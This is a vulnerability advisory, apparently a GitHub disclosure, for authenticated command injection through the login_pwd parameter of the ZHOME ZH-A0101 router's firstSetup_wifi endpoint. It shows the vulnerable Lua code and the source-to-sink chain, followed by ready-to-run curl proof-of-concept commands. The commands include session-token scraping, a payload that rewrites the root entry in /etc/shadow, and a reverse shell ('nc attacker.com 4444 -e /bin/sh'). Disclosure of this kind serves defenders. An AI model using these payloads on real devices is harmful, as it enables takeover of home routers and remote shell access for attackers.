# Command Injection Vulnerability in ZHOME ZH-A0101 firstSetup_wifi via `login_pwd`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRnetwork/firstSetup_wifi`
- **Affected Parameter:** `login_pwd`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical
- **Special Note:** This setup-wizard endpoint may be exposed during initial device configuration.

## Vulnerability Information

| Item                | Detail                                          |
| ------------------- | ----------------------------------------------- |
| Controller File     | `usr/lib/lua/luci/controller/api/zrNetwork.lua` |
| Model File          | `usr/lib/lua/luci/model/ZRapi/ZRLanWanFun.lua`  |
| Route Definition    | `zrNetwork.lua:42`                              |
| Controller Function | `firstSetup_wifi()`                             |
| Controller Location | line 393-467                                    |
| Model Function      | `ZRLanWanFun.set_passwd()`                      |
| Model Location      | line 867-889                                    |
| Injection Location  | `ZRLanWanFun.lua:877`                           |
| Sink                | `os.execute()`                                  |

## Vulnerable Code

Controller excerpt:
<img width="1005" height="189" alt="image" src="https://github.com/user-attachments/assets/1a58350f-16d5-4959-bd3a-1277b9bf4dd1" />


```lua
local login_pwd = LuciHttp.formvalue("login_pwd")
ZRWan.set_passwd(login_pwd)
```

Model:

<img width="1055" height="753" alt="image" src="https://github.com/user-attachments/assets/5b05e102-9efb-47d1-a9e3-524383d69fca" />


```lua
function set_passwd(setpasswd)
    local lucisys = require("luci.sys")
    local LuciUtil = require("luci.util")
    local fs = require "nixio.fs"
    local result = 0
    local username = "root"

    result = lucisys.user.setpasswd(username, tostring(setpasswd))

    os.execute("uci set system.@system[0].username="..username)
    os.execute("uci set system.@system[0].password="..tostring(setpasswd))
    os.execute("uci commit system")
end
```

## Root Cause

The first-setup password value is passed into the same vulnerable password-setting helper used by the normal password update API. The password is directly concatenated into a UCI shell command.

## Source-to-Sink Chain

```text
POST /api/ZRnetwork/firstSetup_wifi
    |
    v
LuciHttp.formvalue("login_pwd")
    |
    v
ZRWan.set_passwd(login_pwd)
    |
    v
os.execute("uci set system.@system[0].password=" .. tostring(setpasswd))
    |
    v
/bin/sh
```

## Harmless Verification Example

```bash
curl -s --noproxy "*" --max-time 10 -b cookies.txt -X POST \
  --data-urlencode "login_pwd=admin;touch /tmp/vuln36" \
  --data-urlencode "ssid=x" \
  --data-urlencode "password=x" \
  --data-urlencode "encryption=psk2" \
  --data-urlencode "channel=auto" \
  --data-urlencode "txpower=100" \
  --data-urlencode "hidden=0" \
  --data-urlencode "disabled=0" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstSetup_wifi"
```



## Side Effect

The system password may be changed to the full injected string because `lucisys.user.setpasswd()` is called before the vulnerable `os.execute()` line. Testing should account for password restoration.

## Injection Principle

Normal request:

```text
login_pwd = "admin"
```

Executed commands:

```sh
uci set system.@system[0].password=admin
uci commit system
```

Injection request:

```text
login_pwd = "admin;touch /tmp/vuln36"
```

Executed commands:

```sh
uci set system.@system[0].password=admin;touch /tmp/vuln36
uci commit system
```

Shell execution flow:

```text
os.execute("uci set system.@system[0].password=admin;touch /tmp/vuln36")
  │
  ├─ Command 1: uci set system.@system[0].password=admin     → sets password
  └─ Command 2: touch /tmp/vuln36                             → creates file

os.execute("uci commit system")                               → commits config
```

Side effect: The system password is changed to `admin;touch /tmp/vuln36`. The attacker must restore the password after injection.

## Exploit Chain

```text
Attacker
  │
  ├─ Step 1: Obtain root credentials
  │
  ├─ Step 2: Construct HTTP POST request
  │           URL:  /cgi-bin/luci/;stok=<STOK>/api/ZRnetwork/firstSetup_wifi
  │           Body: login_pwd=admin;<COMMAND>&ssid=x&password=x&encryption=psk2...
  │
  ├─ Step 3: os.execute() → /bin/sh executes
  │           Injected command runs after uci set
  │
  ├─ Step 4: Side effect — password changed to string containing injection payload
  │
  └─ Step 5: Attacker logs in with new password and restores original password
              or includes password restoration in the payload
```

## Proof of Concept

```bash
# Obtain session token
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')

# PoC 1: Create file (password will be modified)
curl -s --noproxy "*" --max-time 10 -b cookies.txt -X POST \
  --data-urlencode "login_pwd=admin;touch /tmp/vuln36" \
  --data-urlencode "ssid=x" --data-urlencode "password=x" \
  --data-urlencode "encryption=psk2" --data-urlencode "channel=auto" \
  --data-urlencode "txpower=100" --data-urlencode "hidden=0" \
  --data-urlencode "disabled=0" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstSetup_wifi"

# PoC 2: Side-effect-free exploitation (restore password after injection)
curl -s --noproxy "*" --max-time 10 -b cookies.txt -X POST \
  --data-urlencode 'login_pwd=admin;touch /tmp/pwned;sed -i "s/root:.*/root:\$1\$SD.FRa1K\$D8O0ttaPTFvEs0i.0W.Co.:0:0:99999:7:::/" /etc/shadow' \
  --data-urlencode "ssid=x" --data-urlencode "password=x" \
  --data-urlencode "encryption=psk2" --data-urlencode "channel=auto" \
  --data-urlencode "txpower=100" --data-urlencode "hidden=0" \
  --data-urlencode "disabled=0" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstSetup_wifi"

# Verify after password restoration
ssh -p 1022 root@192.168.18.1 "ls -la /tmp/pwned"

# PoC 3: Reverse shell
curl -s --noproxy "*" --max-time 10 -b cookies.txt -X POST \
  --data-urlencode "login_pwd=admin;nc attacker.com 4444 -e /bin/sh" \
  --data-urlencode "ssid=x" --data-urlencode "password=x" \
  --data-urlencode "encryption=psk2" --data-urlencode "channel=auto" \
  --data-urlencode "txpower=100" --data-urlencode "hidden=0" \
  --data-urlencode "disabled=0" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstSetup_wifi"
```

## Password Recovery

After injection the password is modified. Recovery methods:

```bash
# Method 1: SSH login with the injected password
ssh -p 1022 root@192.168.18.1  # Password: admin;touch /tmp/vuln36

# Method 2: Restore via shadow file
ssh -p 1022 root@192.168.18.1 << 'EOF'
sed -i 's/root:.*/root:$1$SD.FRa1K$D8O0ttaPTFvEs0i.0W.Co.:0:0:99999:7:::/' /etc/shadow
uci set system.@system[0].password=admin
uci commit system
EOF

# Method 3: Inline restoration in payload
login_pwd="admin;touch /tmp/pwned;uci set system.@system[0].password=admin;uci commit system"
```

## Real Device Verification

```text
Request:  POST /api/ZRnetwork/firstSetup_wifi  login_pwd=admin;touch /tmp/vuln36
Response: (WiFi reconfiguration)
SSH verification: -rw-r--r-- 1 root root 0 Jul 28 15:48 /tmp/vuln36  ✅
Password status: Modified to "admin;touch /tmp/vuln36", restoration required
```

<img width="1728" height="168" alt="image" src="https://github.com/user-attachments/assets/3ad117a8-f186-4d6d-a30c-09b2169df76e" />
